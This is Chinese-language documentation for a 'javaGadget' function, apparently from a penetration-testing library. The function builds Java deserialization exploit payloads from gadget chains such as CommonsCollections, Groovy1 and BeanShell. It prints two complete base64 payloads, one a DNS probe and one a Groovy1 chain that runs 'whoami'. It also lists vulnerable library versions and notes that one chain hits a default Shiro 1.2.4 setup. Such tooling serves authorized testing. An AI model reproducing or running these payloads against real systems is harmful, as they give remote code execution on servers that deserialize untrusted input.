# 函数介绍

`javaGadget`函数主要是用来使用给出的 payload 内容以及类型生成对应的 java 反序列化数据

## 函数原型

`func javaGadget(gadget string, payload string, type string) bytes`

### 参数介绍

| 参数名称    | 参数介绍                                                                                                                                            |
|---------|-------------------------------------------------------------------------------------------------------------------------------------------------|
| gadget  | 所需要生成的 gadget 类型，支持`dns`，`jdk7u21`，`jdk8u20`，`beanutil16`，`beanutil18`，`beanutil19`，`k1`，`k2`，`k3`，`k4`，`groovy1`，`beanshellold`，`beanshellnew` |
| payload | 需要向 gadget 中填充的 payload 内容，支持写入`命令`或者`URL`                                                                                                      |
| type    | 所填充的 payload 类型，支持`cmd`/`url`两种模式                                                                                                               |

## 举例

| 待转换数据                          | 转换语句                                                        | 输出结果                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
|--------------------------------|-------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `dns`, `https://www.baidu.com` | `base64(javaGadget("dns", "https://www.baidu.com", "url"))` | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD/////D////3QADXd3dy5iYWlkdS5jb210AAB0AA13d3cuYmFpZHUuY29tdAAFaHR0cHNweHQAFWh0dHBzOi8vd3d3LmJhaWR1LmNvbXg=`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `groovy1`, `whoami`            | `base64(javaGadget("groovy1", "whoami", "cmd"))`            | `rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAsb3JnLmNvZGVoYXVzLmdyb292eS5ydW50aW1lLkNvbnZlcnRlZENsb3N1cmUQIzcZ9xXdGwIAAUwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cgAtb3JnLmNvZGVoYXVzLmdyb292eS5ydW50aW1lLkNvbnZlcnNpb25IYW5kbGVyECM3GtYBvBsCAAJMAAhkZWxlZ2F0ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAC2hhbmRsZUNhY2hldAAoTGphdmEvdXRpbC9jb25jdXJyZW50L0NvbmN1cnJlbnRIYXNoTWFwO3hwc3IAKW9yZy5jb2RlaGF1cy5ncm9vdnkucnVudGltZS5NZXRob2RDbG9zdXJlEQ4+hI+9zkgCAAFMAAZtZXRob2RxAH4ACXhyABNncm9vdnkubGFuZy5DbG9zdXJlPKDHZhYSbFoCAAhJAAlkaXJlY3RpdmVJABltYXhpbXVtTnVtYmVyT2ZQYXJhbWV0ZXJzSQAPcmVzb2x2ZVN0cmF0ZWd5TAADYmN3dAA8TG9yZy9jb2RlaGF1cy9ncm9vdnkvcnVudGltZS9jYWxsc2l0ZS9Cb29sZWFuQ2xvc3VyZVdyYXBwZXI7TAAIZGVsZWdhdGVxAH4AC0wABW93bmVycQB+AAtbAA5wYXJhbWV0ZXJUeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO0wACnRoaXNPYmplY3RxAH4AC3hwAAAAAAAAAAIAAAAAcHQABndob2FtaXEAfgATdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwdnIADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHEAfgAJeHBwdAAHZXhlY3V0ZXNyACZqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50SGFzaE1hcGSZ3hKdhyk9AwADSQALc2VnbWVudE1hc2tJAAxzZWdtZW50U2hpZnRbAAhzZWdtZW50c3QAMVtMamF2YS91dGlsL2NvbmN1cnJlbnQvQ29uY3VycmVudEhhc2hNYXAkU2VnbWVudDt4cAAAAA8AAAAcdXIAMVtMamF2YS51dGlsLmNvbmN1cnJlbnQuQ29uY3VycmVudEhhc2hNYXAkU2VnbWVudDtSdz9BMps5dAIAAHhwAAAAEHNyAC5qYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50SGFzaE1hcCRTZWdtZW50HzZMkFiTKT0CAAFGAApsb2FkRmFjdG9yeHIAKGphdmEudXRpbC5jb25jdXJyZW50LmxvY2tzLlJlZW50cmFudExvY2tmVagsLMhq6wIAAUwABHN5bmN0AC9MamF2YS91dGlsL2NvbmN1cnJlbnQvbG9ja3MvUmVlbnRyYW50TG9jayRTeW5jO3hwc3IANGphdmEudXRpbC5jb25jdXJyZW50LmxvY2tzLlJlZW50cmFudExvY2skTm9uZmFpclN5bmNliDLnU3u/CwIAAHhyAC1qYXZhLnV0aWwuY29uY3VycmVudC5sb2Nrcy5SZWVudHJhbnRMb2NrJFN5bmO4HqKUqkRafAIAAHhyADVqYXZhLnV0aWwuY29uY3VycmVudC5sb2Nrcy5BYnN0cmFjdFF1ZXVlZFN5bmNocm9uaXplcmZVqEN1P1LjAgABSQAFc3RhdGV4cgA2amF2YS51dGlsLmNvbmN1cnJlbnQubG9ja3MuQWJzdHJhY3RPd25hYmxlU3luY2hyb25pemVyM9+vua1tb6kCAAB4cAAAAAA/QAAAc3EAfgAgc3EAfgAkAAAAAD9AAABzcQB+ACBzcQB+ACQAAAAAP0AAAHNxAH4AIHNxAH4AJAAAAAA/QAAAc3EAfgAgc3EAfgAkAAAAAD9AAABzcQB+ACBzcQB+ACQAAAAAP0AAAHNxAH4AIHNxAH4AJAAAAAA/QAAAc3EAfgAgc3EAfgAkAAAAAD9AAABzcQB+ACBzcQB+ACQAAAAAP0AAAHNxAH4AIHNxAH4AJAAAAAA/QAAAc3EAfgAgc3EAfgAkAAAAAD9AAABzcQB+ACBzcQB+ACQAAAAAP0AAAHNxAH4AIHNxAH4AJAAAAAA/QAAAc3EAfgAgc3EAfgAkAAAAAD9AAABzcQB+ACBzcQB+ACQAAAAAP0AAAHNxAH4AIHNxAH4AJAAAAAA/QAAAcHB4dAAIZW50cnlTZXR2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cA==` |

## 类型解释

### k1

    依赖 CommonsCollections <= 3.2.1, 特别的，该 payload 可以打 shiro 1.2.4 默认的环境
    利用链:
    HashMap
        TiedMapEntry.hashCode
            TiedMapEntry.getValue
                LazyMap.decorate
                    InvokerTransformer
                        templates...

### k2

    依赖 CommonsCollections == 4.0
    利用链:
    HashMap
        TiedMapEntry.hashCode
            TiedMapEntry.getValue
                LazyMap.lazyMap
                    InvokerTransformer
                        templates...

### k3

    依赖 CommonsCollections <= 3.2.1
    利用链: 是 CommonsCollections6 的简化版

### k4

    依赖 CommonsCollections <= 4.0
    利用链: 是 CommonsCollections6 的简化版

### beanshellold

    由于内部数据结构复杂，这里使用了curl + url的方式检测漏洞，填充#来补足位数，避免修改复杂的数据结构
    所以传入的参数是url，长度不超过251位

### beanshellnew

    ysoserial中使用的BeanShell的老版本org.beanshell 2.0b5
    新版beanshell用的是org.apache-extras.beanshell 2.0b5
    其中bsh.NameSpace的serialVersionUID也有了变化，所以这里新增BeanShell2 Gadget